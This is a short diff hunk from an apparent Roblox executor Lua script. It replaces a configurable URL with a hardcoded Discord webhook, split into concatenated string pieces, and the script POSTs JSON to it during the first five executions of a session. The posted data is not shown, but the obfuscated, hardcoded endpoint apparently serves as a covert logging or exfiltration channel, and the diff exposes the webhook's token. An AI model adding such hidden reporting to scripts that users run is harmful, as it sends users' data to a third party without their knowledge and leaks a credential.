@@ -76,7 +76,7 @@ local data2 = {
 if getgenv().sessionExecutions < 5 then
 request(
     {
-        Url = url,
+        Url = "https://".."discord.com/api/webhooks/".."1241503371286937600/".."rFvS_m5uBpc_HfmH2LHg1iSgwj".."9hn4bZbKJcyhokxSWj8oYtYOM5jzAHhWJ5J-h0KElL",
         Method = "POST",
         Headers = {
             ["Content-Type"] = "application/json"
